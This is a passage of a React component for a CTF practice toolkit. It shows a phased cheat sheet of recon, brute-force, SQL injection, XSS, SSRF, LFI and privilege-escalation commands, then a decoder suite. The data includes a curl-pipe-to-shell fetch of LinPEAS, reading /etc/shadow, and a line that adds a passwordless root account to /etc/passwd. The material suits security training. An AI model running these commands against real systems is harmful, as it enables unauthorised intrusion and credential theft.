'use client'

import React, { useState, useMemo } from 'react'
import { Target, Radar, Globe, Zap, Shield, Flag, Key, FileSearch, ChevronDown, ChevronRight, Play, Copy, BookOpen, AlertTriangle, CheckCircle2, Lock, Unlock, RefreshCw, Binary, Loader2, Search } from 'lucide-react'
import { cn } from '@/lib/utils'

interface PlaybookAction {
  label: string
  command: string
  note?: string
  risk?: 'safe' | 'medium' | 'aggressive'
}

interface PlaybookPhase {
  id: string
  title: string
  subtitle: string
  icon: React.ElementType
  color: string
  borderColor: string
  bgColor: string
  actions: PlaybookAction[]
  notes: string[]
}

const PHASES: PlaybookPhase[] = [
  {
    id: 'recon',
    title: '01. RECON',
    subtitle: 'Passive & Active Information Gathering',
    icon: Radar,
    color: 'text-sky-400',
    borderColor: 'border-sky-500/30',
    bgColor: 'bg-sky-500/5',
    actions: [
      { label: 'Subdomain Discovery', command: 'subfinder -d {{TARGET}} -silent -o subs.txt', note: 'Passive OSINT subdomain enumeration', risk: 'safe' },
      { label: 'DNS Brute Force', command: 'gobuster dns -d {{TARGET}} -w /usr/share/wordlists/fasttrack.txt -t 20', risk: 'safe' },
      { label: 'Port Scan (Stealth)', command: 'nmap -sS -sV -T3 {{TARGET}}', note: 'SYN stealth — avoids most IDS', risk: 'safe' },
      { label: 'Full Port Scan', command: 'nmap -p- -sV -T4 --open {{TARGET}}', note: 'All 65535 ports', risk: 'medium' },
      { label: 'OS Fingerprinting', command: 'nmap -O -sV -T4 {{TARGET}}', risk: 'medium' },
      { label: 'HTTP Probe All Subs', command: 'httpx -l subs.txt -title -status-code -tech-detect -o live.txt', risk: 'safe' },
      { label: 'Tech Detection', command: 'whatweb {{TARGET}} -v', risk: 'safe' },
      { label: 'Aggressive Sweep', command: 'nmap -A -T4 {{TARGET}}', note: 'OS + version + scripts + traceroute', risk: 'aggressive' },
    ],
    notes: [
      'Always start passive — subfinder/amass before active scanning',
      'Check robots.txt, sitemap.xml, .well-known/ manually',
      'Look for git repos: /.git/, GitLab, GitHub mentions in headers',
    ]
  },
  {
    id: 'enumeration',
    title: '02. ENUMERATION',
    subtitle: 'Deep Target Surface Mapping',
    icon: Globe,
    color: 'text-emerald-400',
    borderColor: 'border-emerald-500/30',
    bgColor: 'bg-emerald-500/5',
    actions: [
      { label: 'Directory Busting (Fast)', command: 'gobuster dir -u http://{{TARGET}} -w /usr/share/wordlists/fasttrack.txt -t 20 -q', risk: 'medium' },
      { label: 'Directory Busting (Deep)', command: 'feroxbuster -u http://{{TARGET}} -w /usr/share/wordlists/dirb/big.txt -t 20 --depth 3', risk: 'aggressive' },
      { label: 'Parameter Fuzzing', command: 'ffuf -w /usr/share/wordlists/fasttrack.txt -u http://{{TARGET}}/FUZZ -mc 200,301,302', risk: 'medium' },
      { label: 'API Endpoint Fuzzing', command: 'ffuf -w /usr/share/wordlists/fasttrack.txt -u http://{{TARGET}}/api/FUZZ -mc 200,201,204', risk: 'medium' },
      { label: 'Web Spider & Crawl', command: 'gospider -s http://{{TARGET}} -d 3 -c 20 --subs --include-other-source', risk: 'safe' },
      { label: 'Vhost Discovery', command: 'gobuster vhost -u http://{{TARGET}} -w /usr/share/wordlists/fasttrack.txt -t 20', risk: 'medium' },
      { label: 'WordPress Scan', command: 'wpscan --url http://{{TARGET}} -e vp,u,ap --random-user-agent', risk: 'medium' },
      { label: 'Nikto Web Audit', command: 'nikto -h http://{{TARGET}} -Tuning 1234567890abcde', note: 'Broad vulnerability scanner', risk: 'aggressive' },
    ],
    notes: [
      'Always check: /admin, /login, /api, /backup, /config, /.env',
      'Hidden params: use arjun to find undocumented GET/POST params',
      'Check HTTP response headers for version leaks (Server, X-Powered-By)',
    ]
  },
  {
    id: 'exploitation',
    title: '03. EXPLOITATION',
    subtitle: 'Weaponized Vulnerability Engagement',
    icon: Zap,
    color: 'text-orange-400',
    borderColor: 'border-orange-500/30',
    bgColor: 'bg-orange-500/5',
    actions: [
      { label: 'Nuclei CVE Scan', command: 'nuclei -u http://{{TARGET}} -t cves/ -severity medium,high,critical -silent', risk: 'medium' },
      { label: 'SQL Injection Test', command: 'sqlmap -u "http://{{TARGET}}" --batch --heuristic-check --banner', risk: 'medium' },
      { label: 'SQLi Full Dump', command: 'sqlmap -u "http://{{TARGET}}" --batch --level 3 --risk 2 --dbs', risk: 'aggressive' },
      { label: 'XSS Scan (DalFox)', command: 'dalfox url "http://{{TARGET}}" --silence', risk: 'medium' },
      { label: 'Template Injection', command: 'tplmap -u "http://{{TARGET}}" --level 5', risk: 'aggressive' },
      { label: 'Command Injection', command: 'commix --url="http://{{TARGET}}" --batch', risk: 'aggressive' },
      { label: 'Nuclei Exposed Panels', command: 'nuclei -u http://{{TARGET}} -t exposed-panels/ -silent', risk: 'safe' },
      { label: 'Nuclei Misconfig', command: 'nuclei -u http://{{TARGET}} -t misconfiguration/ -silent', risk: 'safe' },
    ],
    notes: [
      'Test SQLi manually: \' OR 1=1-- / " OR "1"="1 / UNION SELECT NULL--',
      'XSS payloads: <script>alert(1)</script> / <img src=x onerror=alert(1)>',
      'SSRF test: http://169.254.169.254/latest/meta-data/ (AWS metadata)',
      'LFI test: ?page=../../../../etc/passwd or ?file=../../../etc/passwd',
    ]
  },
  {
    id: 'bruteforce',
    title: '04. CREDENTIALS',
    subtitle: 'Authentication & Credential Attacks',
    icon: Lock,
    color: 'text-red-400',
    borderColor: 'border-red-500/30',
    bgColor: 'bg-red-500/5',
    actions: [
      { label: 'SSH Brute Force', command: 'hydra ssh://{{TARGET}} -L /usr/share/wordlists/fasttrack.txt -P /usr/share/wordlists/fasttrack.txt -V -t 4', risk: 'aggressive' },
      { label: 'FTP Brute Force', command: 'hydra ftp://{{TARGET}} -L /usr/share/wordlists/fasttrack.txt -P /usr/share/wordlists/fasttrack.txt -V', risk: 'aggressive' },
      { label: 'HTTP Login Brute', command: 'hydra http-post-form://{{TARGET}} -L users.txt -P /usr/share/wordlists/fasttrack.txt "/login:user=^USER^&pass=^PASS^:F=Invalid"', risk: 'aggressive' },
      { label: 'Hash Crack (John)', command: 'john --wordlist=/usr/share/wordlists/rockyou.txt {{TARGET}}', note: 'Target = hash file path', risk: 'safe' },
      { label: 'Hash Crack (Hashcat)', command: 'hashcat -m 0 {{TARGET}} /usr/share/wordlists/rockyou.txt', note: '-m 0=MD5, 100=SHA1, 1800=sha512crypt', risk: 'safe' },
      { label: 'RDP Brute Force', command: 'hydra rdp://{{TARGET}} -L /usr/share/wordlists/fasttrack.txt -P /usr/share/wordlists/fasttrack.txt', risk: 'aggressive' },
      { label: 'MySQL Brute', command: 'hydra mysql://{{TARGET}} -l root -P /usr/share/wordlists/fasttrack.txt -V', risk: 'aggressive' },
    ],
    notes: [
      'Common creds first: admin:admin, admin:password, root:toor, user:user',
      'Hashcat modes: -m 0 (MD5) -m 100 (SHA1) -m 1000 (NTLM) -m 1800 (SHA-512)',
      'John auto-detect: john hash.txt (will guess hash type)',
      'Use --status in John to check cracking progress',
    ]
  },
  {
    id: 'forensics',
    title: '05. FORENSICS',
    subtitle: 'File, Memory & Steganography Analysis',
    icon: FileSearch,
    color: 'text-violet-400',
    borderColor: 'border-violet-500/30',
    bgColor: 'bg-violet-500/5',
    actions: [
      { label: 'File Type & Metadata', command: 'exiftool {{TARGET}}', note: 'Target = file path', risk: 'safe' },
      { label: 'Strings Extraction', command: 'strings {{TARGET}} | grep -i flag', risk: 'safe' },
      { label: 'Binwalk File Carve', command: 'binwalk -e {{TARGET}}', note: 'Extracts embedded files', risk: 'safe' },
      { label: 'Foremost Carve', command: 'foremost -i {{TARGET}} -o ./carved/', risk: 'safe' },
      { label: 'Steg Extract (Steghide)', command: 'steghide extract -sf {{TARGET}} -p ""', note: 'Try empty password first', risk: 'safe' },
      { label: 'Steg Brute (Stegseek)', command: 'stegseek {{TARGET}} /usr/share/wordlists/rockyou.txt', risk: 'safe' },
      { label: 'Memory Process List', command: 'vol -f {{TARGET}} windows.pslist.PsList', risk: 'safe' },
      { label: 'Memory Net Scan', command: 'vol -f {{TARGET}} windows.netscan.NetScan', risk: 'safe' },
    ],
    notes: [
      'Always run: file <target> && xxd <target> | head -20 (check magic bytes)',
      'Stego checklist: steghide, binwalk, zsteg, stegsolve, exiftool',
      'Zip cracking: zip2john file.zip > hash.txt && john hash.txt',
      'Base64 decode: echo "..." | base64 -d or cyberchef',
    ]
  },
  {
    id: 'postexploit',
    title: '06. POST-EXPLOIT',
    subtitle: 'Privilege Escalation & Persistence',
    icon: Shield,
    color: 'text-amber-400',
    borderColor: 'border-amber-500/30',
    bgColor: 'bg-amber-500/[0.03]',
    actions: [
      { label: 'LinPEAS (Linux PrivEsc)', command: 'curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh', risk: 'aggressive' },
      { label: 'SUID Binaries', command: 'find / -perm -4000 -type f 2>/dev/null', risk: 'safe' },
      { label: 'SUDO Permissions', command: 'sudo -l', risk: 'safe' },
      { label: 'Cron Jobs', command: 'cat /etc/crontab && ls -la /etc/cron*', risk: 'safe' },
      { label: 'Network Connections', command: 'ss -tunap && netstat -tunap', risk: 'safe' },
      { label: 'Readable Shadow', command: 'cat /etc/shadow && cat /etc/passwd', risk: 'safe' },
      { label: 'Writable /etc/passwd', command: 'ls -la /etc/passwd && stat /etc/passwd', risk: 'safe' },
      { label: 'Docker Escape Check', command: 'ls -la /.dockerenv && cat /proc/1/cgroup', risk: 'safe' },
    ],
    notes: [
      'GTFOBins: https://gtfobins.github.io — look up any SUID binary',
      'Check PATH hijacking: echo $PATH && ls -la $(which <binary>)',
      'Writable /etc/passwd: add new root: echo "hax::0:0::/root:/bin/bash" >> /etc/passwd',
      'Kernel exploits: uname -a then search exploit-db',
    ]
  },
  {
    id: 'flags',
    title: '07. FLAGS',
    subtitle: 'Common Flag Locations & Extraction',
    icon: Flag,
    color: 'text-yellow-400',
    borderColor: 'border-yellow-500/30',
    bgColor: 'bg-yellow-500/5',
    actions: [
      { label: 'Find Flag Files', command: 'find / -name "flag*" -o -name "*.flag" -o -name "user.txt" -o -name "root.txt" 2>/dev/null', risk: 'safe' },
      { label: 'Grep for Flag Pattern', command: 'grep -r "CTF{" / 2>/dev/null || grep -r "flag{" / 2>/dev/null', risk: 'safe' },
      { label: 'HTB Flag Locations', command: 'cat /home/*/user.txt /root/root.txt 2>/dev/null', note: 'HackTheBox standard paths', risk: 'safe' },
      { label: 'Base64 Decode', command: 'echo "BASE64STRING" | base64 -d', risk: 'safe' },
      { label: 'Hex Decode', command: 'echo "HEXSTRING" | xxd -r -p', risk: 'safe' },
      { label: 'ROT13 Decode', command: 'echo "STRING" | tr "A-Za-z" "N-ZA-Mn-za-m"', risk: 'safe' },
      { label: 'XOR Brute (Python)', command: 'python3 -c "d=bytes.fromhex(\'DATA\'); print([(i,bytes([b^i for b in d])) for i in range(256)])"', risk: 'safe' },
    ],
    notes: [
      'HTB flags: /home/<user>/user.txt and /root/root.txt',
      'CTF flags often encoded: Base64, Hex, ROT13, XOR, Caesar',
      'Check env variables: env | grep -i flag',
      'Database flag: SELECT * FROM flags; or SELECT * FROM users;',
    ]
  },
]

interface CTFPlaybookProps {
  target?: string
  scanHistory?: any[]
}

export function CTFPlaybook({ target = '{{TARGET}}', scanHistory = [] }: CTFPlaybookProps) {
  const [activeTab, setActiveTab] = useState<'methodology' | 'decoder'>('methodology')
  const [expandedPhase, setExpandedPhase] = useState<string>('recon')
  const [copiedCmd, setCopiedCmd] = useState<string | null>(null)

  // Map tool names to their highest status in history
  const toolStatuses = useMemo(() => {
    const statuses: Record<string, string> = {};
    (scanHistory || []).forEach(h => {
      const tool = h.tool_name?.toLowerCase()
      if (!tool) return
      
      // Status priority: running > completed > failed/killed
      const current = statuses[tool]
      if (h.status === 'running') {
        statuses[tool] = 'running'
      } else if (h.status === 'completed' && current !== 'running') {
        statuses[tool] = 'completed'
      } else if (!current) {
        statuses[tool] = h.status
      }
    })
    return statuses
  }, [scanHistory])

  const getActionStatus = (command: string) => {
    const tool = command.split(' ')[0].toLowerCase()
    return toolStatuses[tool] || 'idle'
  }

  // Decoder Suite State
  const [decoderInput, setDecoderInput] = useState('')
  const [decoderOutput, setDecoderOutput] = useState('')
  const [detectedFormat, setDetectedFormat] = useState<string | null>(null)
  const [decoderMode, setDecoderMode] = useState<string | null>(null)

  const resolveCommand = (cmd: string) =>
    target ? cmd.replace(/\{\{TARGET\}\}/g, target) : cmd

  const copyCommand = (cmd: string) => {
    const resolved = resolveCommand(cmd)
    navigator.clipboard.writeText(resolved)
    setCopiedCmd(resolved)
    setTimeout(() => setCopiedCmd(null), 2000)
  }

  const dispatchCommand = (cmd: string) => {
    const resolved = resolveCommand(cmd)
    document.dispatchEvent(new CustomEvent('populate-command', { detail: resolved }))
  }

  // --- Decoder Algorithms ---
  const handleAutoDetect = () => {
    const trimmed = decoderInput.trim()
    if (!trimmed) {
      setDetectedFormat(null)
      setDecoderMode(null)
      return
    }

    // Binary check (only 0s, 1s and optional spaces)
    const binaryClean = trimmed.replace(/\s/g, '')
    const binaryRegex = /^[01]+$/

    // Hex check (only a-f, A-F, 0-9 and optional spaces or colons like 43:54:46)
    const hexClean = trimmed.replace(/[\s:]/g, '')
    const hexRegex = /^[0-9a-fA-F]+$/

    // Base64 check
    const base64Regex = /^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$/

    if (binaryRegex.test(binaryClean) && binaryClean.length >= 8 && binaryClean.length % 8 === 0) {
      setDetectedFormat('Binary Format Detected')
      setDecoderMode('binary_dec')
      try {
        let result = ''
        for (let i = 0; i < binaryClean.length; i += 8) {
          const byte = binaryClean.substr(i, 8)
          result += String.fromCharCode(parseInt(byte, 2))
        }
        setDecoderOutput(result)
      } catch (e) {
        setDecoderOutput('ERROR: Invalid binary sequence.')
      }
    } else if (hexRegex.test(hexClean) && hexClean.length >= 4 && hexClean.length % 2 === 0) {
      setDetectedFormat('Hexadecimal Encoded Detected')
      setDecoderMode('hex_dec')
      try {
        let str = ''
        for (let i = 0; i < hexClean.length; i += 2) {
          str += String.fromCharCode(parseInt(hexClean.substr(i, 2), 16))
        }
        setDecoderOutput(str)
      } catch (e) {
        setDecoderOutput('ERROR: Invalid Hex content.')
      }
    } else if (trimmed.includes('%') && /%[0-9a-fA-F]{2}/.test(trimmed)) {
      setDetectedFormat('URL Encoding Detected')
      setDecoderMode('url_dec')
      try {
        setDecoderOutput(decodeURIComponent(trimmed))
      } catch (e) {
        setDecoderOutput('ERROR: Invalid URL escape sequence.')
      }
    } else if (trimmed.length >= 4 && base64Regex.test(trimmed)) {
      setDetectedFormat('Base64 Encoding Detected')
      setDecoderMode('b64_dec')
      try {
        setDecoderOutput(atob(trimmed))
      } catch (e) {
        setDecoderOutput('ERROR: Invalid Base64 character sequence.')
      }
    } else {
      setDetectedFormat('Unknown Cipher format - Try manual overrides')
      setDecoderMode(null)
    }
  }

  const handleDecodeB64 = () => {
    setDecoderMode('b64_dec')
    try {
      setDecoderOutput(atob(decoderInput.trim()))
    } catch (e) {
      setDecoderOutput('ERROR: Invalid Base64 character sequence.')
    }
  }

  const handleEncodeB64 = () => {
    setDecoderMode('b64_enc')
    try {
      setDecoderOutput(btoa(decoderInput))
    } catch (e) {
      setDecoderOutput('ERROR: Encoding failed.')
    }
  }

  const handleDecodeHex = () => {
    setDecoderMode('hex_dec')
    try {
      const hex = decoderInput.trim().replace(/\s+/g, '')
      let str = ''
      for (let i = 0; i < hex.length; i += 2) {
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16))
      }
      setDecoderOutput(str)
    } catch (e) {
      setDecoderOutput('ERROR: Invalid Hex content.')
    }
  }

  const handleEncodeHex = () => {
    setDecoderMode('hex_enc')
    try {
      let hex = ''
      for (let i = 0; i < decoderInput.length; i++) {
        hex += decoderInput.charCodeAt(i).toString(16).padStart(2, '0')
      }
      setDecoderOutput(hex)
    } catch (e) {
      setDecoderOutput('ERROR: Encoding failed.')
    }
  }

  const handleROT13 = () => {
    setDecoderMode('rot13')
    const input = decoderInput
    const rot13 = input.replace(/[a-zA-Z]/g, (c) => {
      const base = c <= 'Z' ? 65 : 97
      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base)
    })
    setDecoderOutput(rot13)
  }

  const handleDecodeURL = () => {
    setDecoderMode('url_dec')
    try {
      setDecoderOutput(decodeURIComponent(decoderInput))
    } catch (e) {
      setDecoderOutput('ERROR: Invalid URL escape sequence.')
    }
  }

  const handleEncodeURL = () => {
    setDecoderMode('url_enc')
    try {
      setDecoderOutput(encodeURIComponent(decoderInput))
    } catch (e) {
      setDecoderOutput('ERROR: Encoding failed.')
    }
  }

  const handleDecodeBinary = () => {
    setDecoderMode('binary_dec')
    try {
      const clean = decoderInput.trim().replace(/\s+/g, '')
      let result = ''
      for (let i = 0; i < clean.length; i += 8) {
        const byte = clean.substr(i, 8)
        result += String.fromCharCode(parseInt(byte, 2))
      }
      setDecoderOutput(result)
    } catch (e) {
      setDecoderOutput('ERROR: Invalid binary sequence.')
    }
  }

  const handleGenerateXORScript = () => {
    setDecoderMode('xor')
    const rawInput = decoderInput.trim()
    if (!rawInput) {
      setDecoderOutput('ERROR: Please provide an input string or hex payload.')
      return
    }

    // Convert hex or text to byte array
    let data: number[] = []
    const cleanHex = rawInput.replace(/\s+/g, '')
    const isHex = /^[0-9a-fA-F]+$/.test(cleanHex) && cleanHex.length % 2 === 0
    if (isHex) {
      try {
        data = []
        for (let i = 0; i < cleanHex.length; i += 2) {
          data.push(parseInt(cleanHex.substr(i, 2), 16))
        }
      } catch (e) {
        data = Array.from(rawInput).map(c => c.charCodeAt(0))
      }
    } else {
      data = Array.from(rawInput).map(c => c.charCodeAt(0))
    }

    let output = `[*] AUTOMATED XOR BRUTE-FORCE DECRYPTION\n`
    output += `[*] Input size: ${data.length} bytes (Detected: ${isHex ? 'HEX' : 'PLAINTEXT'})\n`
    output += `[*] Scanning 256 keys in-browser...\n\n`

    const matches: string[] = []
    const printable: string[] = []

    for (let key = 0; key < 256; key++) {
      const decrypted = data.map(b => b ^ key)
      let str = ''
      let isText = true
      
      for (const b of decrypted) {
        if (b < 32 || b > 126) {
          if (b !== 9 && b !== 10 && b !== 13) {
            isText = false
            break
          }
        }
        str += String.fromCharCode(b)
      }

      if (isText && str.trim().length > 0) {
        const lower = str.toLowerCase()
        const hasFlag = ['flag', 'ctf', 'htb', 'thm'].some(f => lower.includes(f))
        const hasBraces = str.includes('{') || str.includes('}')
        const hexKey = '0x' + key.toString(16).padStart(2, '0')

        if (hasFlag) {
          matches.push(`[+] HIGH-CONFIDENCE MATCH FOUND (Key: ${key} / ${hexKey})\n    Decoded String: ${str}\n`)
        } else if (hasBraces) {
          matches.push(`[-] POTENTIAL MATCH FOUND (Key: ${key} / ${hexKey})\n    Decoded String: ${str}\n`)
        } else {
          printable.push(`[.] Key ${key} (${hexKey}): ${str}`)
        }
      }
    }

    if (matches.length > 0) {
      output += matches.join('\n')
      output += `\n[*] Found ${matches.length} matches.\n`
    } else if (printable.length > 0) {
      output += `[*] No high-confidence matches found. Showing printable outputs (first 10):\n\n`
      output += printable.slice(0, 10).join('\n') + '\n'
      if (printable.length > 10) {
        output += `... (${printable.length - 10} more potential keys)`
      }
    } else {
      output += `[-] No printable ASCII string candidates found for any of the 256 keys.\n`
    }

    setDecoderOutput(output)
  }

  const riskColors: Record<string, string> = {
    safe: 'text-emerald-400/70 border-emerald-500/20 bg-emerald-500/5',
    medium: 'text-amber-400/70 border-amber-500/20 bg-amber-500/5',
    aggressive: 'text-red-400/70 border-red-500/20 bg-red-500/5',
  }

  const riskLabels: Record<string, string> = {
    safe: 'PASSIVE',
    medium: 'ACTIVE',
    aggressive: 'LOUD',
  }

  return (
    <div className="w-full h-full bg-[#0a0a0c] flex flex-col overflow-hidden">
      {/* Header Panel */}
      <div className="sticky top-0 z-10 bg-[#0a0a0c]/95 backdrop-blur border-b border-border/40 px-6 py-4 shrink-0 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="p-2 rounded-lg bg-primary/10 border border-primary/20">
            <BookOpen className="size-4 text-primary" />
          </div>
          <div>
            <h2 className="text-sm font-black font-mono tracking-widest uppercase text-foreground">TACTICAL OPERATIONS CENTRE</h2>
            <p className="text-[9px] font-mono text-muted-foreground uppercase tracking-wider opacity-60">
              Offline CTF Toolkit · Interactive Cheat Sheets · Decoders
            </p>
          </div>
        </div>

        {/* Tab Switcher */}
        <div className="flex bg-muted/10 rounded-lg p-0.5 border border-border/40 gap-1 shrink-0">
          <button
            onClick={() => setActiveTab('methodology')}
            className={cn(
              "px-3 py-1.5 rounded font-mono text-[9px] font-black uppercase tracking-wider transition-all",
              activeTab === 'methodology' ? "bg-primary text-primary-foreground shadow-sm" : "text-muted-foreground hover:text-foreground"
            )}
          >
            Methodology
          </button>
          <button
            onClick={() => setActiveTab('decoder')}
            className={cn(
              "px-3 py-1.5 rounded font-mono text-[9px] font-black uppercase tracking-wider transition-all flex items-center gap-1",
              activeTab === 'decoder' ? "bg-primary text-primary-foreground shadow-sm" : "text-muted-foreground hover:text-foreground"
            )}
          >
            <Unlock className="size-3" /> Cipher Decoder
          </button>
        </div>
      </div>

      {/* Tab Contents */}
      <div className="flex-1 overflow-y-auto custom-scrollbar p-6">
        {activeTab === 'methodology' ? (
          <div className="space-y-3">
            {PHASES.map((phase) => {
              const Icon = phase.icon
              const isExpanded = expandedPhase === phase.id
              return (
                <div key={phase.id} className={cn("rounded-xl border overflow-hidden transition-all", phase.borderColor, isExpanded ? phase.bgColor : 'border-border/30 bg-card/10')}>
                  {/* Phase Header */}
                  <button
                    onClick={() => setExpandedPhase(isExpanded ? '' : phase.id)}
                    className="w-full flex items-center gap-3 px-5 py-4 hover:bg-white/[0.02] transition-colors text-left"
                  >
                    <div className={cn("p-2 rounded-lg border", isExpanded ? phase.borderColor : 'border-border/30 bg-muted/10')}>
                      <Icon className={cn("size-4.5", isExpanded ? phase.color : 'text-muted-foreground')} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className={cn("font-mono text-xs sm:text-[13px] font-black uppercase tracking-widest", isExpanded ? phase.color : 'text-muted-foreground')}>
                        {phase.title}
                      </div>
                      <div className="font-mono text-[9px] sm:text-[10px] text-muted-foreground/60 uppercase tracking-wider mt-0.5 truncate">
                        {phase.subtitle}
                      </div>
                    </div>
                    <div className="flex items-center gap-3">
                      {phase.actions.some(a => getActionStatus(a.command) === 'completed') && (
                        <span className="px-2 py-0.5 rounded bg-emerald-500/10 border border-emerald-500/20 font-mono text-[8px] text-emerald-400 font-black uppercase">
                          Progressed
                        </span>
                      )}
                      <span className="font-mono text-[9px] sm:text-[10px] text-muted-foreground/50 uppercase tracking-wider">
                        {phase.actions.length} ACTIONS
                      </span>
                      {isExpanded
                        ? <ChevronDown className={cn("size-4.5", phase.color)} />
                        : <ChevronRight className="size-4.5 text-muted-foreground/40" />
                      }
                    </div>
                  </button>

                  {/* Phase Content */}
                  {isExpanded && (
                    <div className="border-t border-border/30 p-5 space-y-4">
                      <div className="space-y-2">
                        {phase.actions.map((action, i) => {
                          const status = getActionStatus(action.command)
                          return (
                            <div key={i} className={cn(
                              "flex items-start gap-3 p-3.5 rounded-lg border group transition-all",
                              status === 'running' ? "bg-primary/5 border-primary/40 shadow-[0_0_15px_rgba(var(--primary),0.1)]" : 
                              status === 'completed' ? "bg-emerald-500/[0.03] border-emerald-500/20" : "bg-black/30 border-border/20 hover:border-border/50"
                            )}>
                              <div className="flex-1 min-w-0 space-y-2">
                                <div className="flex items-center gap-2 flex-wrap">
                                  <span className={cn(
                                    "font-mono text-xs sm:text-[12px] font-black uppercase tracking-wide",
                                    status === 'running' ? "text-primary" : status === 'completed' ? "text-emerald-400" : "text-foreground"
                                  )}>
                                    {action.label}
                                  </span>
                                  {status === 'running' && (
                                    <span className="flex items-center gap-1 px-2 py-0.5 rounded bg-primary/20 border border-primary/30 font-mono text-[8px] text-primary font-black uppercase animate-pulse">
                                      <Loader2 className="size-2.5 animate-spin" /> Active
                                    </span>
                                  )}
                                  {status === 'completed' && (
                                    <span className="px-2 py-0.5 rounded bg-emerald-500/20 border border-emerald-500/30 font-mono text-[8px] text-emerald-400 font-black uppercase">
                                      Completed
                                    </span>
                                  )}
                                  {action.risk && (
                                    <span className={cn("px-2 py-0.5 rounded border font-mono text-[8px] font-black uppercase tracking-wider", riskColors[action.risk])}>
                                      {riskLabels[action.risk]}
                                    </span>
                                  )}
                                </div>
                                <code className={cn(
                                  "block text-xs sm:text-[12px] font-mono break-all leading-relaxed bg-[#0c0d12]/90 border border-border/10 p-3 rounded-md mt-1.5 select-all",
                                  status === 'running' ? "text-primary/95" : "text-foreground/80"
                                )}>
                                  {resolveCommand(action.command)}
                                </code>
                                {action.note && (
                                  <p className="text-[10px] font-mono text-muted-foreground/50 uppercase tracking-wide mt-1">
                                    ↳ {action.note}
                                  </p>
                                )}
                              </div>
                              <div className="flex flex-col gap-1.5 shrink-0 opacity-0 group-hover:opacity-100 transition-opacity mt-1">
                                <button
                                  onClick={() => dispatchCommand(action.command)}
                                  className="p-2 rounded bg-primary/10 border border-primary/20 hover:bg-primary/20 transition-colors"
                                  title="Populate command bar"
                                >
                                  <Play className="size-3 text-primary fill-current" />
                                </button>
                                <button
                                  onClick={() => copyCommand(action.command)}
                                  className="p-2 rounded bg-muted/10 border border-border/30 hover:bg-muted/20 transition-colors"
                                  title="Copy command"
                                >
                                  {copiedCmd === resolveCommand(action.command)
                                    ? <CheckCircle2 className="size-3 text-emerald-400" />
                                    : <Copy className="size-3 text-muted-foreground" />
                                  }
                                </button>
                              </div>
                            </div>
                          )
                        })}
                      </div>
                      {/* Phase Notes */}
                      {phase.notes.length > 0 && (
                        <div className="rounded-lg border border-amber-500/10 bg-amber-500/[0.03] p-4 space-y-2 mt-4">
                          <div className="flex items-center gap-1.5 mb-2">
                            <AlertTriangle className="size-3.5 text-amber-400/60" />
                            <span className="font-mono text-[9px] sm:text-[10px] font-black uppercase tracking-widest text-amber-400/60">Operator Notes</span>
                          </div>
                          {phase.notes.map((note, i) => (
                            <p key={i} className="font-mono text-[10px] sm:text-xs text-muted-foreground/70 leading-relaxed">
                              • {note}
                            </p>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </div>
              )
            })}
          </div>
        ) : (
          /* DECODER SUITE TAB */
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 h-full">
            {/* Input area & quick actions */}
            <div className="bg-card/10 border border-border/40 rounded-xl p-5 flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <span className="text-[11px] font-black font-mono tracking-wider uppercase text-foreground">Paste Encoded Flag / Hash</span>
                <button
                  onClick={handleAutoDetect}
                  className="px-2 py-1 rounded bg-primary/10 hover:bg-primary/20 border border-primary/30 font-mono text-[9px] font-black uppercase text-primary flex items-center gap-1"
                >
                  <Search className="size-3" /> Auto-Identify Format
                </button>
              </div>

              <textarea
                value={decoderInput}
                onChange={(e) => setDecoderInput(e.target.value)}
                placeholder="E.g. paste base64 strings (Q1RGe2g0eHh9==), hex (4354467b6861787d), binary, or URL string..."
                className="flex-1 w-full min-h-[160px] bg-black/40 border border-border/50 rounded-lg p-3 font-mono text-xs text-foreground placeholder:text-muted-foreground/30 focus:border-primary/40 focus:outline-none resize-none"
              />

              {detectedFormat && (
                <div className="p-2 border border-primary/20 bg-primary/5 rounded font-mono text-[9px] font-bold text-primary uppercase tracking-wide">
                  🕵️ Status: {detectedFormat}
                </div>
              )}

              <div className="space-y-2">
                <span className="text-[10px] font-black font-mono text-muted-foreground uppercase tracking-widest">Manual Cipher Operations</span>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                  <button
                    onClick={handleDecodeB64}
                    className={cn(
                      "py-2 border rounded font-mono text-[10px] font-bold uppercase tracking-wider transition-all",
                      decoderMode === 'b64_dec'
                        ? "bg-primary/10 border-primary/50 text-primary shadow-sm"
                        : "border-border/40 hover:bg-muted/10 text-foreground"
                    )}
                  >
                    Base64 Dec
                  </button>
                  <button
                    onClick={handleEncodeB64}
                    className={cn(
                      "py-2 border rounded font-mono text-[10px] font-bold uppercase tracking-wider transition-all",
                      decoderMode === 'b64_enc'
                        ? "bg-primary/10 border-primary/50 text-primary shadow-sm"
                        : "border-border/40 hover:bg-muted/10 text-foreground"
                    )}
                  >
                    Base64 Enc
                  </button>
                  <button
                    onClick={handleDecodeHex}
                    className={cn(
                      "py-2 border rounded font-mono text-[10px] font-bold uppercase tracking-wider transition-all",
                      decoderMode === 'hex_dec'
                        ? "bg-primary/10 border-primary/50 text-primary shadow-sm"
                        : "border-border/40 hover:bg-muted/10 text-foreground"
                    )}
                  >
                    Hex Dec
                  </button>
                  <button
                    onClick={handleEncodeHex}
                    className={cn(
                      "py-2 border rounded font-mono text-[10px] font-bold uppercase tracking-wider transition-all",
                      decoderMode === 'hex_enc'
                        ? "bg-primary/10 border-primary/50 text-primary shadow-sm"
                        : "border-border/40 hover:bg-muted/10 text-foreground"
                    )}
                  >
                    Hex Enc
                  </button>
                  <button
                    onClick={handleROT13}
                    className={cn(
                      "py-2 border rounded font-mono text-[10px] font-bold uppercase tracking-wider transition-all",
                      decoderMode === 'rot13'
                        ? "bg-primary/10 border-primary/50 text-primary shadow-sm"
                        : "border-border/40 hover:bg-muted/10 text-foreground"
                    )}
                  >
                    ROT13 Cipher
                  </button>
                  <button
                    onClick={handleDecodeURL}
                    className={cn(
                      "py-2 border rounded font-mono text-[10px] font-bold uppercase tracking-wider transition-all",
                      decoderMode === 'url_dec'
                        ? "bg-primary/10 border-primary/50 text-primary shadow-sm"
